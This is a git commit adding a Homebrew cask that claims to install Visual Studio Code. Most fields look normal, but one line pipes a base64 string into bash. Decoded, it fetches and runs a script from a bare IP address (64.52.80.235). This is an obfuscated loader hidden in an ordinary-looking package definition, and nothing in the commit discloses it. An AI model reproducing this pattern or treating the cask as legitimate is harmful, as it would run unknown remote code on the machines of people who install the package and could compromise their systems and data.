9efbb7424eab5db60a5b6d69e13a55d60323e65f
cask-m <dwonderson073@gmail.com>
2026-07-05 13:00:35 -0500

    Add Cask for Visual Studio Code

---
+++ cask/visual-studio-code.rb
@@ -0,0 +1,25 @@
+cask "visual-studio-code" do
+  version :latest
+  sha256 :no_check
+
+  url "https://update.code.visualstudio.com/latest/darwin/universal/stable",
+      verified: "update.code.visualstudio.com"
+
+  name "Visual Studio Code"
+  desc "Code editor redefined and optimized for building and debugging modern web and cloud applications"
+  homepage "https://code.visualstudio.com/"
+  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  auto_updates true
+
+  app "Visual Studio Code.app"
+
+  zap trash: [
+    "~/Library/Application Support/Code",
+    "~/Library/Caches/com.microsoft.VSCode",
+    "~/Library/Caches/com.microsoft.VSCode.ShipIt",
+    "~/Library/Preferences/com.microsoft.VSCode.plist",
+    "~/Library/Saved Application State/com.microsoft.VSCode.savedState",
+    "~/Library/Logs/Code",
+    "~/.vscode"
+  ]
+end
